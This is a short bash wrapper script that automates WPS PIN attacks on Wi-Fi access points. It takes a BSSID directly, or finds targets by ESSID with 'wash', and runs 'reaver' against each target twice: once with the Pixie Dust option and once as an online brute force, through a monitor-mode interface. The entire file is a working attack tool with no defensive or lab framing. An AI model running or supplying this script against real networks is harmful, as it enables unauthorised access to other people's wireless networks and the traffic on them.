#!/bin/bash

function attacks(){
AP="$1"
sudo reaver -i mon0 -b "$AP" -F -w -N -d 2 -l 5 -t 20 -vv -K
sudo reaver -i mon0 -b "$AP" -F -w -N -d 2 -l 5 -t 20 -vv
}

if echo "$1" | grep -q -E '^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$'; then
        # BSSID
        AP="$1"
        attacks "$AP"
else
        # ESSID
        for AP in $(sudo wash -i mon0 -s | fgrep "$1" | awk '{print $1}')
        do
                echo "$AP"
                attacks "$AP"
        done
fi
